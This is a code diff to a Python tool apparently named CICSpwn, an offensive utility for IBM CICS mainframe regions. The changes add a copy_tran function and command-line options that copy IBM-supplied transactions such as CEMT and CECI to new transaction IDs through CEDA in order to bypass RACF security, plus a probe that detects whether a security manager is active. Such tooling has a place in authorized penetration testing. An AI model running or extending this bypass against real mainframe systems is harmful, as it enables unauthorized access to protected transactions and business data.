@@ -43,10 +43,12 @@ TRAN_NUMBER = 1000
 SLEEP = 0.5
 CECI = "CECI"
 CEMT = "CEMT"
+CAT3_TRANS = ["CSRK","CSRS","CSAC","CQPO","CQRY","CPSS"]
 
 # TO DO:
-#   Remove that heresy in CICS ESM check
-#   C file
+#   Bypass on demad
+#   Update a file/TSQueue
+#   upload C code
 #   Query security with any class and resource
 #   Distinguish VTAM authentication from CICS authentication
 #   Write a CICS SHELL in COBOL
@@ -362,7 +364,6 @@ def query_cics(request, verify, line):
       Function to send a request to CICS and see if it worked.
       It does not support double send (required for CECI)
     """
-    
     em.move_to(1,2)
     em.safe_send(format_request(request))
     em.send_enter()
@@ -685,7 +686,7 @@ def get_infos():
     spool, tdqueue, tdqueue2 = None, None,None
        
     whine("Interesting and available IBM supplied transactions: ", 'info')
-    if query_cics('CEMT','Inquire',5):
+    if query_cics(CEMT,'Inquire',5):
         is_cemt = True
         em.send_pf3()
         whine("CEMT", 'good',1)
@@ -695,7 +696,7 @@ def get_infos():
         em.send_pf3()        
         whine("CEDA", 'good',1)
     
-    if query_cics('CECI','ACquire',5):
+    if query_cics(CECI,'ACquire',5):
         is_ceci = True
         em.send_pf3()
         whine("CECI", 'good',1)
@@ -718,7 +719,7 @@ def get_infos():
     if not is_ceci and not is_ceda:
         whine("CECI is not available. Little information will be available on the system", 'err')
         
-    if is_ceda and (not is_ceci or not is_cemt):
+    if is_ceda and (not is_ceci or not is_cemt) and (not results.bypass):
         whine("CECI or CEMT are not available. Little information will be available on the system", 'err')
         response = raw_input(bcolors.YELLOW+'[!] Try to bypass RACF protection ? Y/N [Y]: '+bcolors.ENDC)
         
@@ -796,15 +797,20 @@ def get_infos():
         whine('No way to submit JCL through this CICS region','err',1)
     
     whine("Access control", 'info')
+    em.send_pf3()
     
-     
-    variables = ["READ"]
-    read = get_cics_value('QUERY SECURITY RESC(FACILITY) RESID(XXX) RESIDL(3) ', variables, True)
-    read = ''.join(read)
-    if read == "+0000000035":
-        whine('CICS does not use RACF/ACF2/TopSecret. Every user has as much access as the CICS region ID','good',1)
-    else:
+    if (query_cics('CESN', 'Signon to CICS', 1)):
         whine('CICS uses an ESM (RACF/ACF2/TopSecret), might be tricky to access some functions','info',1)
+    else:
+        whine('CICS does not use RACF/ACF2/TopSecret. Every user has as much access as the CICS region ID','good',1) 
+        
+    #~ variables = ["READ"]
+    #~ read = get_cics_value('QUERY SECURITY RESC(FACILITY) RESID(XXX) RESIDL(3) ', variables, True)
+    #~ read = ''.join(read)
+    #~ if read == "+0000000035":
+        #~ whine('CICS does not use RACF/ACF2/TopSecret. Every user has as much access as the CICS region ID','good',1)
+    #~ else:
+        #~ whine('CICS uses an ESM (RACF/ACF2/TopSecret), might be tricky to access some functions','info',1)
     
     # add check for OMVS, SUPERUSER, SERVER, DAMON, etc.
     
@@ -2031,7 +2037,28 @@ def check_resources(kind, trans):
             print t.strip()+'\t'+cvda[results[0]]+'\t'+cvda[results[1]]
         else:
             print t.strip()+'\t'+'error'+'\t'+'error'
+
+def copy_tran(old_tran, new_tran):
+    whine("Getting current group of "+old_tran,'info')
+    request = "CEDA VIEW TRANS("+old_tran+") GROUP(*)"
+    em.move_to(1,2)
+    em.safe_send(format_request(request))
+    em.send_enter()
     
+    data = em.screen_get()
+    if "DFHAC2002" in data[22]:
+        whine("Cannot access CEDA, security violation","err")
+        sys.exit()
+    elif "not found" in data[20]:
+         whine(old_tran+" could not be found on CICS","err")
+         sys.exit()
+         
+    group = data[4][25:34].strip()
+    if not group or group =="":
+        whine("Could not get group of "+old_tran,"err")
+        sys.exit()
+    
+    activate_supplied(old_tran,group,new_tran,"BBBB")
     
 def main(results):
     global CEMT
@@ -2151,6 +2178,16 @@ def main(results):
     elif results.propagate_user:
         whine("Checking whether "+results.propagate_user+' can submit JOBs', 'info')
         check_propagate(results.propagate_user)
+        
+    elif results.old_tran:
+        if results.new_tran:
+            new_tran = results.new_tran.upper()
+        else:
+            new_tran = CAT3_TRANS[1]
+        old_tran = results.old_tran.upper()
+            
+        whine("Copying "+old_tran+" to "+new_tran, 'info')            
+        copy_tran(old_tran, new_tran)
     
     elif results.all_options:
         get_infos()
@@ -2212,7 +2249,9 @@ if __name__ == "__main__" :
     group_info.add_argument('-q', '--quiet', help='Remove Trailing and journal before performing any action',action='store_true',default=False,dest='journal')
     group_info.add_argument('--ceci', help='CECI new transaction name. Result of -i option.',default="CECI",dest='ceci')
     group_info.add_argument('--cemt', help='CEMT new transaction name. Result of -i option.',default="CEMT",dest='cemt')
-    group_info.add_argument('--bypass', help='if CEDA is available, it copies CEMT and CECI to new transid before using them to bypass RACF',action='store_true',dest='bypass')
+    group_info.add_argument('--bypass', help='if CEDA is available, it copies CEMT and CECI to new transid which bypasses RACF',action='store_true',dest='bypass')
+    group_info.add_argument('-b', help='if CEDA is available, it copies OLD_TRAN to NEW TRAN (-n option) to bypass RACF. if no NEW TRAN is specified, CICSpwn chooses an IBM supplied transaction always available',dest='old_tran')
+    group_info.add_argument('-n', help='if CEDA is available, it copies OLD_TRAN (-b) to NEW TRAN to bypass RACF',dest='new_tran')
     
     
     group_trans.add_argument('-t','--trans', help='Get all installed transactions on a CICS TS server',action='store_true', default=False, dest='trans')
